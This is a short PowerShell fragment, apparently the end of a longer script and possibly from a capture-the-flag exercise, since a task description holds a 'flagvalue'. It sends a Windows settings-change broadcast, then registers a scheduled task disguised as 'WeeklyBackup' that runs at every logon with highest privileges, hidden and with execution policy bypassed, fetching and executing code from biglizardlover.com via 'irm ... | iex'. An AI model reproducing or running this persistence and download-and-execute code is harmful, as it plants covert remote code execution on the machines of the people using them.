...
Add-Type 'using System;using System.Runtime.InteropServices;public class R{[DllImport("user32.dll",SetLastError=true)]public static extern IntPtr SendMessageTimeout(IntPtr hWnd,int Msg,IntPtr wParam,string lParam,int fuFlags,int uTimeout,out IntPtr lpdwResult);}'
[R]::SendMessageTimeout([intptr]0xffff,0x1A,[IntPtr]::Zero,"Intl",2,5000,[ref]([intptr]::Zero)) | Out-Null
Register-ScheduledTask -TaskName "WeeklyBackup" -Description "flagvalue = objecttest + consumerfashion + uniquerebel" -Action (
        New-ScheduledTaskAction -Execute powershell.exe -Argument -ExecutionPolicy Bypass -WindowStyle Hidden -Command "irm biglizardlover.com/gecko | iex") -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
    ) | Out-Null
